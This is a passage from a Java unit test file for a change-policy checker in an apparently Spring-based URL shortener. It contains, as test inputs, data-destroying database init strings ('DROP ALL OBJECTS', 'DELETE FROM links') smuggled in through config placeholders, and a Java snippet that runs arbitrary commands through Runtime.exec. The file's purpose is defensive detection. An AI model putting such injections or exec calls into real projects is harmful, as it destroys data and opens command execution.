        assertThat(rules(PolicyDecision.ALLOW, create("src/main/resources/application.xml", "<properties><entry key=")))
                .containsExactly("CC-09", "CC-10");
        // Only Spring's own locations: an EAR descriptor is not Spring configuration.
        assertThat(rules(PolicyDecision.ALLOW, create("src/main/resources/META-INF/application.xml", "<application/>\n"))).isEmpty();
    }

    @Test
    void jdbcInitScriptsAssembledFromPlaceholdersAreDenied() {
        String options = BASE_CONFIG.replace("MODE=PostgreSQL", "MODE=PostgreSQL;${shortener.db-options}")
                + "shortener.db-options: \"DB_CLOSE_DELAY=-1\"\n";
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, BASE_CONFIG, options.replace("DB_CLOSE_DELAY=-1", "INIT=DROP ALL OBJECTS"))))
                .containsExactly("CC-10");
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, options, options.replace("DB_CLOSE_DELAY=-1", "INIT=DROP ALL OBJECTS"))))
                .as("only the referenced property changed").containsExactly("CC-10");
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, options, options + "---\nshortener:\n  db-options: ${extra:INIT=RUNSCRIPT FROM 'x.sql'}\n")))
                .as("through a further document and a nested default").containsExactly("CC-10");
        assertThat(rules(PolicyDecision.DENY, edit(APPLICATION_YML, options, options.replace("\"DB_CLOSE_DELAY=-1\"", "${shortener.more}")
                + "shortener.more: INIT=DROP ALL OBJECTS\n"))).as("through a chain of properties").containsExactly("CC-10");
        assertThat(rules(PolicyDecision.ALLOW, edit(APPLICATION_YML, options, options.replace("\"DB_CLOSE_DELAY=-1\"", "x${shortener.db-options}x"))))
                .as("a property referring to itself").containsExactly("CC-09");
        assertThat(rules(PolicyDecision.ALLOW, edit(APPLICATION_YML, BASE_CONFIG, options)))
                .as("placeholders without an INIT script").containsExactly("CC-09");
        String existingInit = options.replace("DB_CLOSE_DELAY=-1", "INIT=RUNSCRIPT FROM 'classpath:seed.sql'");
        assertThat(rules(PolicyDecision.ALLOW, edit(APPLICATION_YML, existingInit, existingInit.replace("code-length: 7", "code-length: 8"))))
                .as("an unchanged INIT script").containsExactly("CC-09");
    }

    @Test
    void connectionInitSqlAndProfileActivationAreDenied() {
        for (String added : List.of("spring.datasource.hikari.connection-init-sql: DELETE FROM links\n",
                "spring:\n  profiles:\n    active: legacy\n", "spring.profiles.include[0]: legacy\n",
                "spring.profiles.group.prod: legacy\n")) {
            assertThat(rules(PolicyDecision.ALLOW, edit(APPLICATION_YML, BASE_CONFIG, BASE_CONFIG + added))).as(added)
                    .containsExactly("CC-09", "CC-10");
        }
    }

    @Test
    void aTrailingCommentAfterASplitHarmlessRuntimeQueryIsNotProcessExecution() {
        assertThat(evaluate(null, null, create("src/main/java/demo/Cores.java", """
                class Cores {
                    int n = Runtime.getRuntime() // cores
                        .availableProcessors();
                    int m = Runtime.getRuntime() /* memory */
                        .maxMemory();
                }
                """)).findings()).isEmpty();
        assertThat(rules(PolicyDecision.DENY, create("src/main/java/demo/Shell3.java", """
                class Shell3 {
                    void run(String cmd) throws Exception {
                        Runtime.getRuntime() // just the runtime
                            .exec(cmd);
                    }
                }
                """))).containsExactly("SEC-02");
    }

    @Test
    void javaStatementsIgnoreSeparatorsInsideLiteralsAndComments() {
        assertThat(ChangePolicy.javaStatements("""
                class A { // it's { not a block
                    String s = "a;b{c}"; char c = ';';
                    String t = \"""
                        x; "y" }
                        \""";
                    /* ; { */ void m() {}
                }
                """)).containsExactly("class A", "String s = \"a;b{c}\"", "char c = ';'",
                "String t = \"\"\" x; \"y\" } \"\"\"", "void m()");
    }
}
